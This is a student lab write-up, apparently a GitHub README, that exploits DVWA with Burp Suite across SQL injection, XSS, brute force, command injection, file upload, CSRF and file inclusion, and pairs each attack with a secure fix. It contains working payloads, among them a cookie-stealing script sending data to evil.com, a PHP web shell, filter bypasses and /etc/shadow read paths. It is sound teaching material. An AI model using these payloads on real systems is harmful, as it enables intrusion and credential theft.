# 🔐 OWASP Top 10 Lab Series

> Hands-on web vulnerability testing using **Burp Suite** and **DVWA**  
> Simulated, exploited, and mitigated real web attacks — all in a safe lab environment.

![Burp Suite](https://img.shields.io/badge/Tool-Burp%20Suite-orange?style=flat-square)
![DVWA](https://img.shields.io/badge/Lab-DVWA-red?style=flat-square)
![OWASP](https://img.shields.io/badge/Framework-OWASP%20Top%2010-blue?style=flat-square)
![Level](https://img.shields.io/badge/Level-SOC%20L1%20Fresher-green?style=flat-square)

---

## 🧠 What is DVWA?

**DVWA = Damn Vulnerable Web Application**

> It is a website that is **built to be hacked** — on purpose.
> It is used by security students to practice attacks safely.

```
Normal websites → try very hard to be secure
DVWA            → made intentionally weak, so you can learn attacks
```

Think of it like a **punching bag for hackers.**
You practice on it without hurting anyone.

### DVWA Has 4 Difficulty Levels

| Level | What It Means |
|-------|--------------|
| 🟢 **Low** | No protection at all — very easy to attack |
| 🟡 **Medium** | Some basic protection — needs more skill |
| 🔴 **High** | Strong protection — needs advanced techniques |
| ⚫ **Impossible** | Fully secure — shows how it SHOULD be coded |

> You go from Low → Medium → High to learn step by step.
> Impossible level shows you the **correct secure code.**

---

## 🛠️ Tools Used

### Burp Suite
> Acts like a **middleman** between your browser and the website.
> It catches every request you send and lets you modify it.

```
You click login button
        ↓
Burp Suite catches the request   ← you can edit it here!
        ↓
Modified request goes to website
        ↓
Website responds
```

### DVWA Setup
```bash
# Run DVWA using Docker (easiest method)
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa

# Open in browser
http://localhost/login.php

# Default credentials
Username: admin
Password: password
```

---

## 🗂️ All Vulnerabilities Practiced

---

## 1️⃣ SQL Injection (SQLi)

### What is it — Simply

```
A login form asks for username and password.
Normal user types:   admin / password123

Hacker types in the username box:
admin' OR '1'='1

The database gets confused and gives access
WITHOUT needing a real password.
```

> It's like telling the lock:
> *"Open if the key matches OR if 1=1"*
> 1 always equals 1 — so it always opens. 🔓

---

### 🟢 Low Level — Attack

```
URL: http://localhost/dvwa/vulnerabilities/sqli/

Input in ID field:
1' OR '1'='1

Result: Shows ALL users from the database ✅

Why it works:
The code directly puts your input into the database query.
No checking at all.
```

**What the code looks like (vulnerable):**
```php
// BAD CODE - Low Level
$query = "SELECT * FROM users WHERE id = '$id'";
// Hacker types: 1' OR '1'='1
// Query becomes: SELECT * FROM users WHERE id = '1' OR '1'='1'
// '1'='1' is always TRUE → shows everything
```

---

### 🟡 Medium Level — Attack

```
Medium level uses a dropdown — you can't type directly.
So we use Burp Suite to intercept and change the value.

Step 1: Turn on Burp Suite proxy
Step 2: Select any option in dropdown
Step 3: Burp catches the request
Step 4: Change the value to:  1 OR 1=1
Step 5: Forward the request

Result: Still works! ✅
```

**What the code looks like:**
```php
// MEDIUM CODE - uses mysql_real_escape_string
// Escapes quotes like ' → \'
// But integer injection still works without quotes
$query = "SELECT * FROM users WHERE id = $id";
// No quotes needed: 1 OR 1=1 works directly
```

---

### 🔴 High Level — Attack

```
High level uses a different page + session cookie.
We use UNION-based injection:

Input: 1' UNION SELECT user, password FROM users-- -

Result: Shows usernames + hashed passwords ✅
```

---

### ⚫ Impossible Level — How It's Fixed

```php
// SECURE CODE - Impossible Level
// Uses Prepared Statements — the RIGHT way

$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);   // "i" means integer only
$stmt->execute();

// Now even if hacker types: 1' OR '1'='1
// Database treats it as a STRING, not SQL code
// Attack fails completely ✅
```

**Fix:** Always use **prepared statements.** Never put user input directly into SQL.

---

## 2️⃣ Cross-Site Scripting (XSS)

### What is it — Simply

```
A comment box on a website.
Normal user writes:  "Nice article!"
Hacker writes:       <script>alert('Hacked!')</script>

If the website shows that comment to others —
their browser RUNS the script!
```

> It's like writing a **booby trap in the comment section.**
> Everyone who reads it gets attacked.

### 3 Types of XSS

| Type | Simple Meaning |
|------|---------------|
| **Reflected** | Attack comes back to only you (via a link) |
| **Stored** | Attack saved in database, hits everyone who visits |
| **DOM-based** | Attack happens inside the browser only |

---

### 🟢 Low Level — Reflected XSS

```
Input field: What's your name?

Type this:
<script>alert('XSS')</script>

Result: A popup appears saying "XSS" ✅
Means: Website ran our script without checking.
```

---

### 🟢 Low Level — Stored XSS

```
Go to: DVWA → XSS Stored → Guestbook

In the Message box type:
<script>alert('Stored XSS!')</script>

Submit it.

Now EVERY person who visits this page
will see the popup — not just you!

This is dangerous because:
→ Hacker can steal cookies: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
→ That sends the victim's login cookie to the hacker
→ Hacker logs in as the victim WITHOUT password
```

---

### 🟡 Medium Level — Bypass

```
Medium level blocks <script> tag.
But we can bypass it:

Method 1: Uppercase
<SCRIPT>alert('XSS')</SCRIPT>

Method 2: Image tag
<img src=x onerror="alert('XSS')">

Method 3: Body tag
<body onload="alert('XSS')">

These work because filter only blocks lowercase <script>
```

---

### 🔴 High Level — Bypass

```
High level uses stronger filter.
Bypass using:
<img src=x onerror=alert`XSS`>
or
<svg onload="alert(1)">
```

---

### ⚫ Impossible — How It's Fixed

```php
// SECURE CODE
// htmlspecialchars() converts dangerous characters

echo htmlspecialchars($input, ENT_QUOTES);

// <script> becomes: &lt;script&gt;
// Browser shows it as TEXT, does not run it ✅
```

**Fix:** Always use `htmlspecialchars()` before displaying user input.

---

## 3️⃣ Broken Authentication

### What is it — Simply

```
A website has weak login protection.

Normal login:
→ Wrong password 3 times → account locked ✅

Broken Authentication:
→ No limit on attempts
→ Hacker tries 10,000 passwords automatically
→ Eventually gets in 🔓
```

---

### 🟢 Low Level — Brute Force Attack

```
Step 1: Go to DVWA → Brute Force
Step 2: Type any wrong password
Step 3: Turn on Burp Suite → Intercept ON
Step 4: Catch the login request
Step 5: Send to Burp Intruder

In Intruder:
→ Mark the password field as §password§
→ Load wordlist: /usr/share/wordlists/rockyou.txt
→ Start Attack

Result: Burp tries every password automatically
        Correct password has different response length ✅
```

---

### 🟡 Medium Level

```
Medium adds a 2-second delay between attempts.
This slows down brute force but doesn't stop it.
We just wait longer.
Same Burp Intruder method works.
```

---

### 🔴 High Level

```
High level adds a CSRF token — changes every request.
We need to use Burp Intruder with:
→ Recursive Grep to grab token from each response
→ Use it in the next request automatically
```

---

### ⚫ Impossible — How It's Fixed

```php
// SECURE CODE
// Locks account after 3 wrong attempts
// Adds CAPTCHA
// Uses secure session management

if ($failed_attempts >= 3) {
    // Lock account for 15 minutes
    lockAccount($username);
}
// Also uses bcrypt for password hashing
// Not plain MD5
```

**Fix:** Account lockout + CAPTCHA + strong password hashing (bcrypt).

---

## 4️⃣ Command Injection

### What is it — Simply

```
A website has a ping tool:
"Enter an IP to ping"

Normal user types:  192.168.1.1
Website runs:       ping 192.168.1.1   ← harmless

Hacker types:       192.168.1.1 ; ls
Website runs:       ping 192.168.1.1 ; ls

The ; means "run another command too"
ls shows all files on the server! 😱
```

---

### 🟢 Low Level — Attack

```
Input: 127.0.0.1 ; cat /etc/passwd

Result: Shows all system users on the server ✅

Other payloads:
127.0.0.1 ; whoami          ← who is running the server
127.0.0.1 ; ls /var/www     ← list website files
127.0.0.1 ; id              ← user privileges
```

---

### 🟡 Medium Level — Bypass

```
Medium blocks: && and ;
But NOT: |  or  ||

Payload: 127.0.0.1 | whoami
Still works! ✅
```

---

### 🔴 High Level — Bypass

```
High blocks many characters.
But this still works:
127.0.0.1|whoami
(no space before pipe)
```

---

### ⚫ Impossible — How It's Fixed

```php
// SECURE CODE
// Only allows valid IP format — nothing else

$ip = $_GET['ip'];
if (preg_match('/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/', $ip)) {
    shell_exec("ping -c 4 " . $ip);
} else {
    echo "Invalid IP!";
}
// Hacker types: 127.0.0.1 ; ls
// Does not match IP pattern → BLOCKED ✅
```

**Fix:** Whitelist valid input format. Reject everything else.

---

## 5️⃣ File Upload Vulnerability

### What is it — Simply

```
A website lets you upload a profile photo.
Normal user uploads:  photo.jpg   ← safe

Hacker uploads:       shell.php   ← dangerous!

If website accepts it:
Hacker opens:  website.com/uploads/shell.php
Now hacker can run ANY command on the server!
```

---

### 🟢 Low Level — Attack

```
Step 1: Create a file called shell.php

Content of shell.php:
<?php system($_GET['cmd']); ?>

Step 2: Upload it — website accepts it!
Step 3: Open: http://localhost/dvwa/hackable/uploads/shell.php?cmd=whoami
Step 4: See the server's response ✅

This is called a Web Shell — full server control!
```

---

### 🟡 Medium Level — Bypass

```
Medium checks file type (MIME type).
But MIME type comes from the browser — we can fake it!

Step 1: Rename file to: shell.php.jpg
Step 2: Upload it
Step 3: Burp Suite intercepts
Step 4: Change filename back to shell.php
Step 5: Change Content-Type to: image/jpeg
Step 6: Forward — it gets accepted! ✅
```

---

### 🔴 High Level — Bypass

```
High checks actual file content (magic bytes).
PHP shell disguised inside image:

Step 1: Take a real JPG file
Step 2: Add PHP code at the end:
        <?php system($_GET['cmd']); ?>
Step 3: Upload the file — passes image check
Step 4: Use with file inclusion vulnerability to execute
```

---

### ⚫ Impossible — How It's Fixed

```php
// SECURE CODE
// Checks real file content, not just extension
// Renames file randomly
// Stores outside web root

$allowed = ['image/jpeg', 'image/png', 'image/gif'];
$fileinfo = finfo_open(FILEINFO_MIME_TYPE);
$type = finfo_file($fileinfo, $_FILES['file']['tmp_name']);

if (!in_array($type, $allowed)) {
    die("Only images allowed!");
}

// Random filename — hacker can't guess the URL
$new_name = md5(uniqid()) . '.jpg';
```

**Fix:** Check real file content + random filename + store outside web root.

---

## 6️⃣ CSRF (Cross-Site Request Forgery)

### What is it — Simply

```
You are logged into your bank.
You visit a hacker's website in another tab.

Hacker's page secretly sends:
"Transfer ₹10,000 to hacker's account"
to your bank — using YOUR login session!

Your bank thinks YOU sent it.
Money is gone. 😨
```

---

### 🟢 Low Level — Attack

```
Step 1: Note the password change URL:
http://localhost/dvwa/vulnerabilities/csrf/
?password_new=hacked&password_conf=hacked&Change=Change

Step 2: Create evil.html:
<img src="http://localhost/dvwa/vulnerabilities/csrf/
?password_new=hacked&password_conf=hacked&Change=Change">

Step 3: Victim opens evil.html while logged into DVWA
Step 4: Password changes to "hacked" — silently! ✅
```

---

### ⚫ Impossible — How It's Fixed

```php
// SECURE CODE
// Uses CSRF Token — unique random value per request

$token = md5(uniqid(rand(), TRUE));
$_SESSION['token'] = $token;

// Hidden field in every form:
<input type="hidden" name="token" value="<?=$token?>">

// Hacker cannot guess this random token
// Their fake request has no valid token → BLOCKED ✅
```

**Fix:** Always include a **CSRF token** in every form.

---

## 7️⃣ File Inclusion

### What is it — Simply

```
Website URL looks like:
website.com/page.php?file=about.html

Hacker changes it to:
website.com/page.php?file=../../etc/passwd

Website includes that file and shows it!
Hacker can read any file on the server. 😱
```

### LFI (Local File Inclusion)
```
Payload: ../../../../etc/passwd
Result: Shows all system users ✅

Other useful files:
../../../../etc/shadow           ← password hashes
../../../../var/log/apache2/access.log  ← server logs
../../../../proc/self/environ    ← environment variables
```

### RFI (Remote File Inclusion)
```
Payload: http://evil.com/shell.txt
Website fetches and runs the hacker's file remotely!
Full server compromise possible.
```

---

## 8️⃣ Security Misconfiguration

### What We Found in DVWA

```
❌ Default credentials (admin/password) not changed
❌ Error messages show database details
❌ Directory listing enabled — shows all files
❌ Old software versions running
❌ Unnecessary services running
```

### How to Fix

```
✅ Change all default passwords immediately
✅ Turn off detailed error messages in production
✅ Disable directory listing in server config
✅ Keep all software updated
✅ Remove unused features and services
```

---

## 📊 Summary Table — All Vulnerabilities

| # | Vulnerability | Tool Used | DVWA Level Done | Fixed By |
|---|--------------|-----------|-----------------|----------|
| 1 | SQL Injection | Burp Suite | Low, Medium, High | Prepared Statements |
| 2 | XSS Reflected | Browser + Burp | Low, Medium, High | htmlspecialchars() |
| 3 | XSS Stored | Browser | Low, Medium | htmlspecialchars() |
| 4 | Brute Force | Burp Intruder | Low, Medium, High | Account Lockout |
| 5 | Command Injection | Browser | Low, Medium, High | Input Whitelist |
| 6 | File Upload | Burp Suite | Low, Medium, High | File Type Check |
| 7 | CSRF | HTML page | Low, Medium | CSRF Token |
| 8 | File Inclusion | Browser | Low, Medium | Disable allow_url_include |
| 9 | Security Misconfig | Manual | All | Hardening Checklist |
| 10 | Broken Auth | Burp Intruder | Low, Medium, High | Lockout + bcrypt |

---

## 🔄 How Burp Suite Was Used

```
1. PROXY        → Intercept every request between browser and DVWA
2. REPEATER     → Send same request multiple times with changes
3. INTRUDER     → Automated brute force with wordlists
4. DECODER      → Decode Base64, URL encoding, HTML encoding
5. COMPARER     → Compare two responses to find differences
6. SCANNER      → Auto-detect vulnerabilities (Pro version)
```

---

## 📁 Project Structure

```
owasp-top10-lab/
│
├── 01-sql-injection/
│   ├── notes.md          ← attack steps + screenshots
│   └── payloads.txt      ← all SQLi payloads used
│
├── 02-xss/
│   ├── reflected.md
│   ├── stored.md
│   └── payloads.txt
│
├── 03-brute-force/
│   ├── notes.md
│   └── wordlist-used.txt
│
├── 04-command-injection/
│   └── notes.md
│
├── 05-file-upload/
│   ├── notes.md
│   └── shell.php         ← test web shell used in lab
│
├── 06-csrf/
│   ├── notes.md
│   └── evil.html         ← CSRF PoC page
│
├── 07-file-inclusion/
│   └── notes.md
│
├── 08-security-misconfig/
│   └── checklist.md
│
└── README.md
```

---

## 🎯 Key Learnings

```
✅ Learned how attackers think and what they look for
✅ Understood why input validation is critical
✅ Practiced using Burp Suite for real penetration testing
✅ Understood the difference between attack and defense
✅ Learned secure coding patterns for each vulnerability
✅ Practiced all 4 DVWA levels for each attack
```


## ⚠️ Legal Disclaimer

> All testing was done on **DVWA running locally on my own machine.**
> No real websites were attacked.
> This lab is purely for learning purposes.

---

*OWASP Top 10 Lab Series | Burp Suite + DVWA | SOC L1 Project | 2025–26*
